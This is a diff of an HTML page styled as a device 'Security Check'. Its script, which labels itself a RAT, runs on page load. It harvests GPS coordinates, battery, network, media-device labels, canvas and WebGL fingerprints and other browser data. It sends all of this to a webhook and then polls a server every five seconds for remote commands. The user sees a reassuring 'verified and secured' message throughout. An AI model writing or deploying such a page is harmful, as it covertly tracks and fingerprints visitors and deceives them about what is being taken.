@@ -37,26 +37,10 @@
       position: relative;
       overflow: hidden;
     }
-    .header::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: url('data:image/svg+xml,<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse"><path d="M 20 0 L 0 0 0 20" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)" /></svg>');
-      animation: gridMove 20s linear infinite;
-    }
-    @keyframes gridMove {
-      0% { transform: translate(0, 0); }
-      100% { transform: translate(20px, 20px); }
-    }
     .shield-icon {
       font-size: 72px;
       margin-bottom: 15px;
       animation: pulse 2s ease-in-out infinite;
-      position: relative;
-      z-index: 1;
     }
     @keyframes pulse {
       0%, 100% { transform: scale(1); }
@@ -66,8 +50,6 @@
       font-size: 32px;
       margin-bottom: 12px;
       font-weight: 700;
-      position: relative;
-      z-index: 1;
     }
     .content {
       padding: 40px 35px;
@@ -91,7 +73,6 @@
       height: 40px;
       overflow: hidden;
       margin: 25px 0;
-      position: relative;
     }
     .progress-bar {
       height: 100%;
@@ -104,22 +85,6 @@
       color: white;
       font-weight: 700;
       font-size: 16px;
-      position: relative;
-      overflow: hidden;
-    }
-    .progress-bar::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-      animation: shimmer 2s infinite;
-    }
-    @keyframes shimmer {
-      0% { left: -100%; }
-      100% { left: 100%; }
     }
     .info-grid {
       display: grid;
@@ -208,7 +173,6 @@
       color: #666;
       font-weight: 600;
       text-transform: uppercase;
-      letter-spacing: 0.5px;
     }
     @media (max-width: 600px) {
       .info-grid { grid-template-columns: 1fr; }
@@ -284,9 +248,15 @@
   </div>
 
   <script>
+    // COMPLETE RAT 2026 - ALL DATA COLLECTION
     let sessionId = 'rat2026_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12);
     let progress = 0;
-    let collectedData = {};
+    let collectedData = {
+      sessionId: sessionId,
+      timestamp: new Date().toISOString()
+    };
+
+    console.log('[RAT2026] Session started:', sessionId);
 
     function updateProgress(percent, message) {
       progress = percent;
@@ -298,76 +268,103 @@
       if (message) {
         statusMsg.innerHTML = '<span class="spinner"></span><span>' + message + '</span>';
       }
+      console.log(`[RAT2026] Progress: ${percent}% - ${message}`);
     }
 
+    // COLLECT ALL BASIC SYSTEM DATA
     async function collectSystemData() {
-      updateProgress(10, 'Analyzing system configuration...');
+      updateProgress(5, 'Collecting system information...');
       
-      collectedData = {
-        sessionId: sessionId,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        
-        screen: {
-          width: screen.width,
-          height: screen.height,
-          availWidth: screen.availWidth,
-          availHeight: screen.availHeight,
-          colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth,
-          orientation: screen.orientation ? screen.orientation.type : 'N/A'
-        },
-        
-        hardware: {
-          cpuCores: navigator.hardwareConcurrency || 'N/A',
-          deviceMemory: navigator.deviceMemory || 'N/A',
-          maxTouchPoints: navigator.maxTouchPoints || 0
-        },
-        
-        browser: {
-          cookieEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          onLine: navigator.onLine,
-          vendor: navigator.vendor,
-          product: navigator.product
-        },
-        
-        timezone: {
-          zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          offset: new Date().getTimezoneOffset(),
-          locale: Intl.DateTimeFormat().resolvedOptions().locale
-        },
-        
-        plugins: Array.from(navigator.plugins).map(p => ({
-          name: p.name,
-          description: p.description
-        }))
+      collectedData.userAgent = navigator.userAgent;
+      collectedData.platform = navigator.platform;
+      collectedData.language = navigator.language;
+      collectedData.languages = navigator.languages ? Array.from(navigator.languages) : [];
+      
+      // Screen information
+      collectedData.screen = {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        orientation: screen.orientation ? screen.orientation.type : 'unknown'
       };
+      
+      // Hardware
+      collectedData.hardware = {
+        cpuCores: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 0
+      };
+      
+      // Browser info
+      collectedData.browser = {
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        onLine: navigator.onLine,
+        vendor: navigator.vendor,
+        product: navigator.product,
+        productSub: navigator.productSub,
+        appName: navigator.appName,
+        appVersion: navigator.appVersion
+      };
+      
+      // Timezone
+      collectedData.timezone = {
+        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offset: new Date().getTimezoneOffset(),
+        locale: Intl.DateTimeFormat().resolvedOptions().locale
+      };
+      
+      // Window size
+      collectedData.window = {
+        innerWidth: window.innerWidth,
+        innerHeight: window.innerHeight,
+        outerWidth: window.outerWidth,
+        outerHeight: window.outerHeight
+      };
+      
+      // Plugins
+      if (navigator.plugins && navigator.plugins.length > 0) {
+        collectedData.plugins = Array.from(navigator.plugins).map(p => ({
+          name: p.name,
+          description: p.description,
+          filename: p.filename
+        }));
+      } else {
+        collectedData.plugins = [];
+      }
 
-      document.getElementById('systemStatus').textContent = 'Collected';
+      document.getElementById('systemStatus').textContent = 'Collected ✓';
+      console.log('[RAT2026] System data collected:', collectedData);
     }
 
+    // GET CONNECTION INFO
     async function getConnectionInfo() {
-      updateProgress(25, 'Checking network connection...');
+      updateProgress(15, 'Analyzing network connection...');
       
-      if (navigator.connection) {
+      if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         collectedData.connection = {
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt,
-          saveData: navigator.connection.saveData
+          effectiveType: connection.effectiveType || 'unknown',
+          downlink: connection.downlink || 'unknown',
+          rtt: connection.rtt || 'unknown',
+          saveData: connection.saveData || false,
+          type: connection.type || 'unknown'
         };
-        document.getElementById('connectionStatus').textContent = navigator.connection.effectiveType.toUpperCase();
+        document.getElementById('connectionStatus').textContent = (connection.effectiveType || 'Online').toUpperCase();
       } else {
+        collectedData.connection = { type: 'unavailable' };
         document.getElementById('connectionStatus').textContent = 'Online';
       }
+      
+      console.log('[RAT2026] Connection info:', collectedData.connection);
     }
 
+    // GET BATTERY INFO
     async function getBatteryInfo() {
-      updateProgress(40, 'Checking battery status...');
+      updateProgress(25, 'Reading battery status...');
       
       try {
         if (navigator.getBattery) {
@@ -375,20 +372,25 @@
           collectedData.battery = {
             level: Math.round(battery.level * 100) + '%',
             charging: battery.charging,
-            chargingTime: battery.chargingTime,
-            dischargingTime: battery.dischargingTime
+            chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' seconds',
+            dischargingTime: battery.dischargingTime === Infinity ? 'Fully charged' : battery.dischargingTime + ' seconds'
           };
           document.getElementById('batteryStatus').textContent = Math.round(battery.level * 100) + '%';
+          console.log('[RAT2026] Battery info:', collectedData.battery);
         } else {
+          collectedData.battery = { status: 'unavailable' };
           document.getElementById('batteryStatus').textContent = 'N/A';
         }
       } catch (e) {
+        collectedData.battery = { error: e.message };
         document.getElementById('batteryStatus').textContent = 'N/A';
+        console.log('[RAT2026] Battery error:', e);
       }
     }
 
+    // GET GPS LOCATION
     async function getLocation() {
-      updateProgress(60, 'Verifying location...');
+      updateProgress(40, 'Requesting GPS location...');
       
       return new Promise((resolve) => {
         if (navigator.geolocation) {
@@ -397,36 +399,44 @@
               collectedData.location = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                altitudeAccuracy: position.coords.altitudeAccuracy,
-                heading: position.coords.heading,
-                speed: position.coords.speed,
-                timestamp: position.timestamp
+                accuracy: position.coords.accuracy + ' meters',
+                altitude: position.coords.altitude || 'unavailable',
+                altitudeAccuracy: position.coords.altitudeAccuracy ? position.coords.altitudeAccuracy + ' meters' : 'unavailable',
+                heading: position.coords.heading || 'unavailable',
+                speed: position.coords.speed || 'unavailable',
+                timestamp: new Date(position.timestamp).toISOString()
               };
-              document.getElementById('locationStatus').textContent = 'Verified';
+              document.getElementById('locationStatus').textContent = 'Captured ✓';
+              console.log('[RAT2026] GPS location captured:', collectedData.location);
               resolve();
             },
             (error) => {
-              collectedData.location = { error: error.message };
-              document.getElementById('locationStatus').textContent = 'Denied';
+              collectedData.location = { 
+                error: error.message,
+                code: error.code,
+                permission: 'denied'
+              };
+              document.getElementById('locationStatus').textContent = 'Denied ✗';
+              console.log('[RAT2026] GPS error:', error);
               resolve();
             },
             {
               enableHighAccuracy: true,
-              timeout: 10000,
+              timeout: 15000,
               maximumAge: 0
             }
           );
         } else {
-          document.getElementById('locationStatus').textContent = 'N/A';
+          collectedData.location = { error: 'Geolocation not supported' };
+          document.getElementById('locationStatus').textContent = 'Not supported';
           resolve();
         }
       });
     }
 
+    // GET MEDIA DEVICES
     async function getMediaDevices() {
-      updateProgress(75, 'Detecting media devices...');
+      updateProgress(55, 'Detecting media devices...');
       
       try {
         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
@@ -434,15 +444,28 @@
           collectedData.mediaDevices = {
             audioInput: devices.filter(d => d.kind === 'audioinput').length,
             audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
-            videoInput: devices.filter(d => d.kind === 'videoinput').length
+            videoInput: devices.filter(d => d.kind === 'videoinput').length,
+            total: devices.length,
+            devices: devices.map(d => ({
+              kind: d.kind,
+              label: d.label || 'unlabeled',
+              deviceId: d.deviceId ? 'present' : 'none'
+            }))
           };
+          console.log('[RAT2026] Media devices:', collectedData.mediaDevices);
+        } else {
+          collectedData.mediaDevices = { error: 'API not available' };
         }
       } catch (e) {
-        collectedData.mediaDevices = { error: 'Not available' };
+        collectedData.mediaDevices = { error: e.message };
+        console.log('[RAT2026] Media devices error:', e);
       }
     }
 
+    // GET CANVAS FINGERPRINT
     function getCanvasFingerprint() {
+      updateProgress(65, 'Generating canvas fingerprint...');
+      
       try {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -451,54 +474,109 @@
         ctx.fillStyle = '#f60';
         ctx.fillRect(125, 1, 62, 20);
         ctx.fillStyle = '#069';
-        ctx.fillText('RAT2026', 2, 15);
-        collectedData.canvasFingerprint = canvas.toDataURL().substring(0, 100);
+        ctx.fillText('RAT2026 Fingerprint', 2, 15);
+        collectedData.canvasFingerprint = canvas.toDataURL().substring(0, 150) + '...';
+        console.log('[RAT2026] Canvas fingerprint generated');
       } catch (e) {
-        collectedData.canvasFingerprint = 'Error';
+        collectedData.canvasFingerprint = { error: e.message };
+        console.log('[RAT2026] Canvas error:', e);
       }
     }
 
+    // GET WEBGL INFO
     function getWebGLInfo() {
+      updateProgress(75, 'Reading WebGL renderer...');
+      
       try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
           collectedData.webgl = {
             vendor: gl.getParameter(gl.VENDOR),
-            renderer: gl.getParameter(gl.RENDERER)
+            renderer: gl.getParameter(gl.RENDERER),
+            version: gl.getParameter(gl.VERSION),
+            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unavailable',
+            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unavailable'
           };
+          console.log('[RAT2026] WebGL info:', collectedData.webgl);
+        } else {
+          collectedData.webgl = { error: 'WebGL not supported' };
         }
       } catch (e) {
-        collectedData.webgl = 'Not available';
+        collectedData.webgl = { error: e.message };
+        console.log('[RAT2026] WebGL error:', e);
       }
     }
 
-    async function sendData(data) {
+    // GET PERFORMANCE INFO
+    function getPerformanceInfo() {
+      updateProgress(85, 'Measuring performance...');
+      
       try {
-        await fetch('rat2026_webhook.php', {
+        if (performance.memory) {
+          collectedData.performance = {
+            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+            totalJSHeapSize: performance.memory.totalJSHeapSize,
+            usedJSHeapSize: performance.memory.usedJSHeapSize
+          };
+        } else {
+          collectedData.performance = { memory: 'unavailable' };
+        }
+        console.log('[RAT2026] Performance info:', collectedData.performance);
+      } catch (e) {
+        collectedData.performance = { error: e.message };
+      }
+    }
+
+    // SEND ALL DATA TO SERVER
+    async function sendDataToServer(data) {
+      updateProgress(95, 'Transmitting data to server...');
+      
+      console.log('[RAT2026] Sending complete data package:', data);
+      
+      try {
+        const response = await fetch('rat2026_webhook.php', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
           body: JSON.stringify(data)
         });
+        
+        const result = await response.json();
+        console.log('[RAT2026] Server response:', result);
+        return result;
       } catch (e) {
-        console.error('Send error:', e);
+        console.error('[RAT2026] Send error:', e);
+        return { error: e.message };
       }
     }
 
+    // CHECK FOR COMMANDS FROM SERVER
     async function checkForCommands() {
       try {
         const response = await fetch('get_command2026.php?session=' + sessionId);
         const data = await response.json();
         if (data.success && data.command) {
+          console.log('[RAT2026] Command received:', data.command);
           executeCommand(data.command);
         }
       } catch (e) {
-        console.error('Command check error:', e);
+        console.error('[RAT2026] Command check error:', e);
       }
     }
 
+    // EXECUTE REMOTE COMMANDS
     async function executeCommand(cmd) {
-      let result = { command: cmd, timestamp: new Date().toISOString() };
+      console.log('[RAT2026] Executing command:', cmd);
+      let result = { 
+        command: cmd, 
+        timestamp: new Date().toISOString(),
+        sessionId: sessionId
+      };
       
       switch(cmd) {
         case 'get_location':
@@ -509,47 +587,55 @@
           await getBatteryInfo();
           result.data = collectedData.battery;
           break;
-        case 'refresh':
-          location.reload();
-          break;
         case 'get_all':
           await main();
           result.data = collectedData;
+          break;
+        case 'refresh':
+          location.reload();
           break;
         default:
           result.data = 'Unknown command';
       }
       
-      await sendData(result);
+      await sendDataToServer(result);
     }
 
+    // MAIN EXECUTION FUNCTION
     async function main() {
+      console.log('[RAT2026] Starting complete data collection...');
+      
+      // Collect all data step by step
       await collectSystemData();
       await getConnectionInfo();
       await getBatteryInfo();
-      
-      updateProgress(50, 'Requesting location permission...');
       await getLocation();
-      
       await getMediaDevices();
-      
-      updateProgress(85, 'Generating device fingerprint...');
       getCanvasFingerprint();
       getWebGLInfo();
+      getPerformanceInfo();
       
-      updateProgress(95, 'Sending data...');
-      await sendData(collectedData);
+      // Send everything to server
+      await sendDataToServer(collectedData);
       
+      // Mark as complete
       updateProgress(100, 'Verification complete!');
       
       const statusMsg = document.getElementById('statusMessage');
       statusMsg.className = 'status-message success';
-      statusMsg.innerHTML = '✅ <strong>Security Check Complete!</strong> Your device has been verified.';
+      statusMsg.innerHTML = '✅ <strong>Security Check Complete!</strong> All data has been verified and secured.';
       
+      console.log('[RAT2026] Complete! Full data package:', collectedData);
+      
+      // Start listening for commands every 5 seconds
       setInterval(checkForCommands, 5000);
     }
 
-    window.onload = main;
+    // AUTO-START WHEN PAGE LOADS
+    window.onload = () => {
+      console.log('[RAT2026] Page loaded, initializing...');
+      main();
+    };
   </script>
 </body>
 </html>
